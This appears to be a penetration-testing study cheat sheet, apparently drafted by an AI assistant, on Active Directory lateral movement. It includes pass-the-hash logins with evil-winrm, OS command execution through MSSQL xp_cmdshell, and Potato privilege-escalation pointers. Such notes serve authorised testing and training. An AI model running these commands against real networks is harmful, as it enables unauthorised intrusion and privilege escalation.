# Lateral Movement Cheat Sheet

## 1. Goal

- After foothold → **lateral/vertical movement** → domain compromise or higher privileges.

---

## 2. Key Lateral Movement Techniques

- **Pass-the-Hash (SMB)** → when local admin rights available.
- **RDP** → GUI access to remote host.
- **WinRM / PowerShell Remoting** → command-line access, Enter-PSSession.
- **MSSQL Server** → sysadmin rights → run OS commands via `xp_cmdshell`.

---

## 3. Enumeration (Always Start Here)

### BloodHound edges to check:

- `CanRDP`
- `CanPSRemote`
- `SQLAdmin`

### PowerView commands:

```PowerShell
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Management Users"
```

### BloodHound Cypher queries:

- Find users in the domain has CanPSRemote rights to a host?

```Plain
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer)
RETURN p2
```

- **Find SQL Admins:**

```Plain
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer)
RETURN p2
```

- **Pre-built BH queries:**
    - _Find Workstations where Domain Users can RDP_
    - _Find Servers where Domain Users can RDP_

---

## 4. RDP

### Enumeration

```PowerShell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

- Look for `Domain Users` membership = **all users can RDP**.

### Exploitation

- Tools:
    - Linux → `xfreerdp`, `remmina`
    - Windows → `mstsc.exe`
- Use foothold creds → RDP → harvest creds, escalate, pivot.

---

## 5. WinRM / PowerShell Remoting

### Enumeration

```PowerShell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

### From Windows host

```PowerShell
$password = ConvertTo-SecureString "Pass123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\User",$password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
Exit-PSSession
```

### From Linux host

- Install:

```Bash
gem install evil-winrm
```

- Use:

```Bash
evil-winrm -i <IP> -u <USER> -p <PASS>
# or evil-winrm -i <IP> -u <USER> -H <NTHASH>
```

---

## 6. MSSQL

### Enumeration

PowerUpSQL:

```PowerShell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

### Authenticate & query

```PowerShell
Get-SQLQuery -Instance "IP,1433" -username "domain\user" -password "Pass123!" -query "SELECT @@version"
```

### From Linux (Impacket)

```Bash
mssqlclient.py domain/user@<IP> -windows-auth
```

### Commands (in SQL shell)

```SQL
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell whoami /priv
```

- Look for **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege** → escalate with Potato exploits.

---

## 7. Privilege Escalation Indicators

Run:

```Shell
whoami /priv
```

Flags to watch:

- `SeImpersonatePrivilege`
- `SeAssignPrimaryTokenPrivilege`

Exploits: **JuicyPotato / PrintSpoofer / RoguePotato**

---

## 8. Tools Quick List

- **Enumeration:** BloodHound, PowerView
- **RDP:** xfreerdp, remmina, mstsc.exe
- **WinRM:** evil-winrm, Enter-PSSession
- **MSSQL:** PowerUpSQL, Impacket mssqlclient.py
- **Credential abuse:** Pass-the-Hash

---

## 9. Operational Checklist (Quick Flow)

1. **Run BloodHound** → look for `CanRDP`, `CanPSRemote`, `SQLAdmin`.
2. **Check local groups** with PowerView.
3. **RDP access?** → pivot, dump creds, escalate.
4. **WinRM access?** → `Enter-PSSession` or `evil-winrm`.
5. **SQL sysadmin?** → PowerUpSQL / mssqlclient → `xp_cmdshell`.
6. **Check privileges** (`whoami /priv`) → Potato escalation if possible.
7. **Repeat enumeration** from new host.

---

Would you like me to also **add a condensed “one-pager” version** (pure commands only, no explanation) so you can keep it open on a second screen during testing? That way you’d have both the structured notes and a bare-bones quick reference.